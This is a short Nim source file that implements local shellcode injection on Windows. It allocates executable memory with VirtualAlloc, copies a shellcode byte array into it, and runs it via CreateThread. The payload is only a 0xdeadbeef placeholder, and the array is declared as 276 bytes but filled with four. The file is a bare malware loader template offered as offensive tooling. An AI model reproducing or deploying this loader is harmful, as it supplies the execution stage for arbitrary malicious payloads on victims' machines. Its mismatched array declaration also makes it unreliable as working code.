#-----------------------------------------------------------
# Author: KrknSec
# Description: Example of local shellcode injection in Nim
#-----------------------------------------------------------

import winim/lean

var data: array[276,byte] = [
    byte 0xde,0xad,0xbe,0xef
]

var bufAddress = VirtualAlloc(NULL, cast[SIZE_T](data.len), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

copyMem(bufAddress, addr(data), cast[SIZE_T](data.len))

var hThread = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](bufAddress), NULL, 0, NULL)

WaitForSingleObject(hThread, -1)
CloseHandle(hThread)
